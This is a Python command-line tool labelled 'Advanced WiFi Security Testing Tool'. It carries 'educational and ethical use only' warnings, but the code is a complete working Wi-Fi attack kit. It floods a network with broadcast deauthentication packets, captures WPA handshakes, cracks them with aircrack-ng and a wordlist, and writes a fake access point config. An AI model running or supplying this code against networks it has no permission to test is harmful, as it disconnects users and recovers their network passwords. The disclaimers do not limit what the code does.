#!/usr/bin/env python3
"""
Advanced WiFi Security Testing Tool
EDUCATIONAL AND ETHICAL USE ONLY
Only use on networks you own or have explicit permission to test
"""

import subprocess
import time
import re
import os
import signal
import sys
from scapy.all import *
from scapy.layers.dot11 import *
import argparse
import threading

class WiFiSecurityTester:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.target_networks = []
        self.captured_handshakes = []
        self.is_monitoring = False
        
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        print(f"Enabling monitor mode on {self.interface}...")
        
        try:
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         capture_output=True, check=True)
            
            # Start monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                                  capture_output=True, text=True, check=True)
            
            # Check if monitor interface was created
            if "monitor mode enabled" in result.stdout.lower():
                print(f"Monitor mode enabled successfully on {self.monitor_interface}")
                return True
            else:
                print("Failed to enable monitor mode")
                return False
                
        except subprocess.CalledProcessError as e:
            print(f"Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode and restore managed mode"""
        print(f"Disabling monitor mode on {self.monitor_interface}...")
        
        try:
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                         capture_output=True, check=True)
            print("Monitor mode disabled successfully")
            
        except subprocess.CalledProcessError as e:
            print(f"Error disabling monitor mode: {e}")
    
    def scan_networks(self, duration=30):
        """Scan for WiFi networks and gather information"""
        print(f"Scanning networks for {duration} seconds...")
        
        networks = {}
        
        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = packet[Dot11].addr3
                channel = int(ord(packet[Dot11Elt:3].info))
                
                # Extract security information
                security = "Open"
                if packet.haslayer(Dot11Elt):
                    elt = packet[Dot11Elt]
                    while elt:
                        if elt.ID == 48:  # RSN Information Element
                            security = "WPA2"
                        elif elt.ID == 221 and elt.info.startswith(b'\x00\x50\xf2\x01'):
                            security = "WPA"
                        elt = elt.payload if hasattr(elt, 'payload') else None
                
                if ssid and ssid not in ['', ' ']:
                    networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'security': security,
                        'signal_strength': packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 'Unknown'
                    }
        
        # Start packet capture
        try:
            sniff(iface=self.monitor_interface, prn=packet_handler, timeout=duration, store=0)
        except Exception as e:
            print(f"Error during network scan: {e}")
            return {}
        
        self.target_networks = networks
        return networks
    
    def display_networks(self, networks):
        """Display discovered networks in a formatted table"""
        print("\nDiscovered Networks:")
        print("-" * 80)
        print(f"{'#':<3} {'SSID':<20} {'BSSID':<18} {'CH':<3} {'Security':<10} {'Signal':<8}")
        print("-" * 80)
        
        for i, (bssid, info) in enumerate(networks.items(), 1):
            print(f"{i:<3} {info['ssid']:<20} {bssid:<18} {info['channel']:<3} "
                  f"{info['security']:<10} {info['signal_strength']:<8}")
    
    def deauth_attack(self, target_bssid, client_mac=None, count=10):
        """Perform deauthentication attack to capture handshakes"""
        print(f"Starting deauth attack on {target_bssid}")
        
        if client_mac:
            print(f"Targeting specific client: {client_mac}")
        else:
            client_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast to all clients
            print("Targeting all clients (broadcast)")
        
        # Create deauth packet
        deauth_packet = RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=client_mac,
            addr2=target_bssid,
            addr3=target_bssid
        ) / Dot11Deauth(reason=7)
        
        try:
            for i in range(count):
                sendp(deauth_packet, iface=self.monitor_interface, verbose=0)
                time.sleep(0.1)
                print(f"Sent deauth packet {i+1}/{count}", end='\r')
                
            print(f"\nDeauth attack completed. Sent {count} packets.")
            
        except Exception as e:
            print(f"Error during deauth attack: {e}")
    
    def capture_handshake(self, target_bssid, duration=60):
        """Capture WPA/WPA2 handshakes"""
        print(f"Capturing handshakes for {target_bssid} for {duration} seconds...")
        
        handshake_packets = []
        
        def handshake_handler(packet):
            if packet.haslayer(EAPOL):
                # Check if it's a 4-way handshake packet
                if packet[Dot11].addr3 == target_bssid:
                    handshake_packets.append(packet)
                    print(f"Captured EAPOL packet from {packet[Dot11].addr2}")
        
        # Start handshake capture in a separate thread
        capture_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.monitor_interface, 
                prn=handshake_handler, 
                timeout=duration,
                store=0
            )
        )
        capture_thread.start()
        
        # Perform deauth attack to force handshake
        time.sleep(2)  # Wait a moment before starting deauth
        self.deauth_attack(target_bssid, count=5)
        
        capture_thread.join()
        
        if len(handshake_packets) >= 2:
            print(f"Successfully captured {len(handshake_packets)} handshake packets!")
            
            # Save handshake to file
            filename = f"handshake_{target_bssid.replace(':', '')}.cap"
            wrpcap(filename, handshake_packets)
            print(f"Handshake saved to {filename}")
            
            self.captured_handshakes.append({
                'bssid': target_bssid,
                'filename': filename,
                'packets': len(handshake_packets)
            })
            
            return True
        else:
            print("Failed to capture complete handshake")
            return False
    
    def crack_handshake(self, handshake_file, wordlist_file):
        """Attempt to crack captured handshake using aircrack-ng"""
        print(f"Attempting to crack handshake: {handshake_file}")
        print(f"Using wordlist: {wordlist_file}")
        
        try:
            result = subprocess.run([
                'aircrack-ng', 
                '-w', wordlist_file,
                handshake_file
            ], capture_output=True, text=True, timeout=300)
            
            if "KEY FOUND" in result.stdout:
                # Extract the password
                password_match = re.search(r'KEY FOUND! \[ (.*) \]', result.stdout)
                if password_match:
                    password = password_match.group(1)
                    print(f"Password found: {password}")
                    return password
            else:
                print("Password not found in wordlist")
                return None
                
        except subprocess.TimeoutExpired:
            print("Cracking timeout - try a smaller wordlist")
            return None
        except subprocess.CalledProcessError as e:
            print(f"Error during cracking: {e}")
            return None
    
    def create_fake_ap(self, ssid, channel=6):
        """Create a fake access point for educational purposes"""
        print(f"Creating fake AP: {ssid} on channel {channel}")
        print("This is for educational purposes only!")
        
        # Create configuration for hostapd
        config_content = f"""
interface={self.monitor_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=testpassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""
        
        # Write config file
        with open('/tmp/fake_ap.conf', 'w') as f:
            f.write(config_content)
        
        print(f"Fake AP configuration created: /tmp/fake_ap.conf")
        print("To start the fake AP, run:")
        print(f"sudo hostapd /tmp/fake_ap.conf")
    
    def packet_injection_test(self):
        """Test packet injection capabilities"""
        print("Testing packet injection capabilities...")
        
        try:
            # Create a test beacon frame
            test_packet = RadioTap() / Dot11(
                type=0, subtype=8,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2="00:11:22:33:44:55",
                addr3="00:11:22:33:44:55"
            ) / Dot11Beacon(cap=0x1104) / Dot11Elt(
                ID="SSID", info="TestInjection"
            ) / Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96\x0c\x12\x18\x24")
            
            # Send test packet
            sendp(test_packet, iface=self.monitor_interface, verbose=1)
            print("Packet injection test completed successfully!")
            return True
            
        except Exception as e:
            print(f"Packet injection test failed: {e}")
            return False

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\nExiting gracefully...")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Advanced WiFi Security Testing Tool")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface")
    parser.add_argument("--scan", action="store_true", help="Scan for networks")
    parser.add_argument("--monitor", action="store_true", help="Enable monitor mode")
    parser.add_argument("--deauth", help="Perform deauth attack on BSSID")
    parser.add_argument("--capture", help="Capture handshake for BSSID")
    parser.add_argument("--crack", nargs=2, metavar=("HANDSHAKE", "WORDLIST"),
                       help="Crack handshake file with wordlist")
    parser.add_argument("--fake-ap", help="Create fake AP with given SSID")
    parser.add_argument("--test-injection", action="store_true", help="Test packet injection")
    parser.add_argument("--duration", type=int, default=30, help="Scan/capture duration")
    
    args = parser.parse_args()
    
    # Display warning
    print("=" * 60)
    print("ADVANCED WIFI SECURITY TESTING TOOL")
    print("EDUCATIONAL AND ETHICAL USE ONLY")
    print("Only use on networks you own or have permission to test")
    print("Unauthorized access to networks is illegal")
    print("=" * 60)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    tester = WiFiSecurityTester(args.interface)
    
    try:
        if args.monitor:
            tester.enable_monitor_mode()
        
        if args.scan:
            if not tester.enable_monitor_mode():
                return
            networks = tester.scan_networks(args.duration)
            tester.display_networks(networks)
        
        if args.deauth:
            if not tester.enable_monitor_mode():
                return
            tester.deauth_attack(args.deauth)
        
        if args.capture:
            if not tester.enable_monitor_mode():
                return
            tester.capture_handshake(args.capture, args.duration)
        
        if args.crack:
            handshake_file, wordlist_file = args.crack
            tester.crack_handshake(handshake_file, wordlist_file)
        
        if args.fake_ap:
            tester.create_fake_ap(args.fake_ap)
        
        if args.test_injection:
            if not tester.enable_monitor_mode():
                return
            tester.packet_injection_test()
            
    finally:
        # Clean up - disable monitor mode
        if hasattr(tester, 'monitor_interface'):
            tester.disable_monitor_mode()

if __name__ == "__main__":
    main()